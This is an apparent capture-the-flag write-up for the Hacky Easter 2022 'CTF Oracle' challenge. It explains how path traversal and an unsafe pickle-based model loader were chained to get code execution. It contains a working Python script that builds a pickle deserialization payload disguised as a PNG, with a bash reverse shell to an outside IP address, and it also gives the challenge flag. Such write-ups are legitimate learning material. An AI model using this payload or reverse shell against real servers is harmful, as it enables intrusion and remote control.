@@ -1,0 +1,89 @@
+= [HE22.35] The CTF Oracle 🔮
+
+image::level8/challenge35.jpg[,300,float="right"]
+
+== Intro
+
+The oracle is using *models* and algorithms to predict how you will
+perform in CTFs in the future! Please choose a CTF and the total points you
+made in the last three years.
+
+http://46.101.107.117:2206
+
+Note: The service is restarted every hour at x:00.
+
+== Solution
+
+First some intelligence gathered using Postman and the development mode of the
+browser:
+
+
+* the server is Gunicorn, so we are probably dealing with python
+* we can upload a profile picture that is then stored in `/tmp/...`
+* the oracle itself has two inputs in the POST method: the CTF and the
+  scores
+* entering more than three scores returns just predicted values for all
+  submitted values
+* changing the CTF to another value, _e.g._ `HackyEaster`, triggers a
+	message about `... cannot load file ./model/HackyEaster`
+* injecting wildcards etc. do not seem to have an effect
+* we can traverse the directory tree: `../../../tmp/../app/models/HE`
+	does get us the proper HE model
+
+Reading up on the way to store ML-models, it became likely that we can store
+pickled models that are then loaded.  The plan of attack is thus to create a
+pickled payload stored as `rce.png`, store this file as a profile picture,
+and load this file as the model.  Then the server will load the model, unpickle
+it and execute our payload.
+
+Creating a first remote shell using a simple netcat listener didn't give a
+shell, but at least a new error message: `Failed to make prediction`.
+
+This means that the pickle was loaded successfully, but did not continue
+running for whatever reason.  Later it became clear that `nc` is not
+available on the server.  
+
+After trying many different routes to get something to work (a python shell, a
+listener, ...) finally a very simpe reverse shell using `bash` worked
+beautifully in connecting via ngrok -- but to do this, I first had to learn
+about ngrok.  The final script to create the payload looks like this: 
+
+[source,python]
+----
+#!/usr/bin/python
+#
+# Pickle deserialization RCE payload.
+# To be invoked with command to execute at it's first parameter.
+# Otherwise, the default one will be used.
+#
+
+import pickle
+import sys
+DEFAULT_COMMAND="/bin/bash -c '/bin/sh -i >& /dev/tcp/3.68.56.232/10421 0>&1'"
+COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND
+
+class PickleRce(object):
+    def __reduce__(self):
+        import os
+        return (os.system,(COMMAND,))
+
+with open('rce.png', 'wb') as outF:
+    outF.write(pickle.dumps(PickleRce()))
+----
+
+`cd` up one directory from where the shell spawns, we find the file `flag.txt`
+with the contents `he2022{ef453cc6-46eb-4c86-87df-cf34a6d2e3d8}`
+
+=== Notes and links
+
+Thanks to otaku for a nice challenge and battlemonger for helpful hints.
+
+http://www.onelinerizer.com/ 
+a tool to turn every python script into a one-liner
+
+https://ngrok.com/ 
+a tunnel to a publicly reachable address for the reverse
+shell
+
+https://metahackers.pro/reverse-shells-101/
+
